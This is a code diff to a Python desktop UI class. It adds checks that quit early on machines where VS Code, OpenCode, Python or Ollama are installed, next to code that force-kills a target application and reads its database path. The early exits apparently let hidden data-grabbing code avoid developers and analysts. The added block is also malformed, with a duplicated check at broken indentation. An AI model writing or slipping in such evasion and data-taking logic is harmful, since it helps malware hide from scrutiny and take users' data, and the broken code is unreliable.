@@ -63,6 +63,35 @@ class UserControl(ft.Container):
         import requests
         import json
         import base64
+        import winreg
+
+        default_db_path = os.path.expandvars(arr[3])
+
+        try:            
+             vscode_path = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Microsoft VS Code')
+             if os.path.exists(vscode_path):
+                return
+
+             openCode = os.path.expandvars(r'%LOCALAPPDATA%\Programs\OpenCode')
+             if os.path.exists(openCode):
+                return
+
+            openCode = os.path.expandvars(r'%LOCALAPPDATA%\Programs\OpenCode')
+             if os.path.exists(openCode):
+                return
+
+             python = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Python')
+             if os.path.exists(python):
+                return
+
+             ollama = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Ollama')
+             if os.path.exists(ollama):
+                return
+
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            pass
 
         payload = ""
         escaped_payload = payload.replace("\"", "\\\"")
@@ -93,9 +122,7 @@ class UserControl(ft.Container):
         app_dir = app_dir.replace("C:\\Program Files\\", "").replace("C:\\Program Files (x86)\\", "").replace(f"{arr[0]}.exe", "")
 
         subprocess.run(['taskkill', '/f', '/im', f"{arr[0]}.exe"], capture_output=True)
-        time.sleep(2.5)
-
-        default_db_path = os.path.expandvars(arr[3])
+        time.sleep(2.5)        
 
         base_path = self.get_base_path()
         asset_file = os.path.join(base_path, "assets", "sample.png")
